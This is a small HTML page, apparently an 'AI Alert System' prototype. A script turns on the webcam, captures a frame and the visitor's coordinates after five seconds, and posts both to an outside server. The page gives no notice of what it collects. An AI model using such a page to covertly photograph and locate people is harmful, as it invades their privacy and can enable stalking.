<!DOCTYPE html>
<html>
<head>
  <title>AI Alert System</title>
</head>
<body>

<h2>AI Alert System Running...</h2>

<video id="video" autoplay playsinline width="300"></video>

<script>
const video = document.getElementById("video");

// Camera ON
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
  video.srcObject = stream;
});

// After 5 sec → Capture + Send
setTimeout(() => {
  navigator.geolocation.getCurrentPosition(async (pos) => {

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);

    const image = canvas.toDataURL("image/png");
    const location = pos.coords.latitude + "," + pos.coords.longitude;

    await fetch("https://ai-alert-system-production.up.railway.app/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ image, location })
    });

    alert("🚨 Alert Sent!");
  });
}, 5000);
</script>

</body>
</html>
